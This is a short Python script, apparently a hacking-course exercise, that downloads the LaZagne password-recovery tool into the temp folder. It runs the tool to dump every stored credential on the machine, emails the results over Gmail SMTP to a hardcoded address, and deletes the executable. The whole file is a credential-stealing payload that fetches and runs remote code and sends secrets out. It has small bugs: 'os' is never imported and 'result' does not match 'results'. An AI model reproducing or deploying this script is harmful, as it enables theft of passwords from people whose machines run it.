#!/usr/bin/env python

#!/usr/bin/env python
import requests, subprocess, smtplib, tempfile

def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()

def download(url):
    get_response = requests.get(url)
    file_name = url.split("/")[-1]
    #print(get_response.content)
    print(file_name)
    with open(file_name, "wb") as out_file:
        out_file.write(get_response.content)

temp_directory = tempfile.gettempdir()
os.chdir(temp_directory)
download("https://github.com/AlessandroZ/LaZagne/releases/download/2.4.3/lazagne.exe")
results = subprocess.check_output("lazagne.exe all", shell=True)
send_mail("my_email@gmail.com", "abc123", result)
os.remove("lazagne.exe")